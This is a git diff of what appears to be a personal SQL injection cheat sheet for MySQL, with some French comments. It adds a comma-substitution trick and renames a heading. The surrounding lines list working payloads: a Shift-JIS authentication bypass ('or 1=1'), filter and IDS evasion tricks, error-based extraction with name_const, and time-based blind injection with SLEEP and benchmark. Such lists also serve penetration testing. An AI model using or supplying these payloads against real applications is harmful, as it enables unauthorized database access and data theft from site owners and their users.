@@ -18,6 +18,7 @@ login=%a5%27+or+1=1%23 (shift-js) 0xa5 becomes \ when encoded as shift-jis so it
 # leet tips
 mysql allow chars from 09, 0A-0D, A0 to be used as whitespaces
 mysql utf-8 collation ('Ä' is equal 'a') can bypass php checks: 'orÄnge' will bypass "if ($username === 'orange')"
+twitter: "You can use %82 on MySQL 5 as a replacement for %2C when performing SQL injections"
 select 1,info from information_schema.processlist # afficher la requete SQL
 and 1=1 procedure analyse() # afficher les noms des colonnes du select
 evade IDS with information_schema.{key_column_usage,table_constraints,statistics,partitions}
@@ -63,7 +64,7 @@ lang=fr' AND (select 1 from (select count(*), concat(0x3a64616a3a,(select versio
 ?id=0 or (select*from(select(name_const(version(),1)),name_const(version(),1))a) or
 ?id=0 or (select 1 REGEXP if(1=1,'+','.'))
 
-# time blind based
+# time based
 lang=en' and benchmark(20000000,sha1(1))
 lang=en' AND SLEEP(5)
 lang=existe_pas' OR sleep(2) # will sleep 2 seconds for each record
